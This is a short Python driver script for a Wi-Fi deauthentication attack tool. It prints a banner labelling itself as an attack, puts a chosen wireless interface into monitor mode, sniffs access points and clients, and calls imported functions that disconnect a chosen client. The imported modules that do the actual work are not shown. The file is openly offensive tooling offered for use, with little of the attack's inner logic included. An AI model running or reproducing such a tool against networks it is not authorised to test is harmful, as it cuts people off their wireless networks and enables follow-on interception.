from Deauth import sniffWIFI, sniffClient, deauth_1
from tools import chooseInterface, startMonitorMode
print("""\033[1;32;48m                                             
 \ \        / (_)      |  ____(_)                                                 
  \ \  /\  / / _ ______| |__   _                                                  
   \ \/  \/ / | |______|  __| | |                                                 
    \  /\  /  | |      | |    | |                                                 
  ___\/  \/   |_|      |_|_   |_|              _   _           _   _              
 |  __ \                 | | | |              | | (_)         | | (_)             
 | |  | | ___  __ _ _   _| |_| |__   ___ _ __ | |_ _  ___ __ _| |_ _  ___  _ __   
 | |  | |/ _ \/ _` | | | | __| '_ \ / _ \ '_ \| __| |/ __/ _` | __| |/ _ \| '_ \  
 | |__| |  __/ (_| | |_| | |_| | | |  __/ | | | |_| | (_| (_| | |_| | (_) | | | | 
 |_____/ \___|\__,_|\__,_|\__|_| |_|\___|_| |_|\__|_|\___\__,_|\__|_|\___/|_| |_| 
     /\  | | | |           | |                                                    
    /  \ | |_| |_ __ _  ___| | __                                                 
   / /\ \| __| __/ _` |/ __| |/ /                                                 
  / ____ \ |_| || (_| | (__|   <                                                  
 /_/    \_\__|\__\__,_|\___|_|\_\                                                 

    """)
interface1 = chooseInterface("choose interface:")

startMonitorMode(interface1)

AP = sniffWIFI(interface1)

client = sniffClient(AP)

deauth_1(AP, client, interface1)
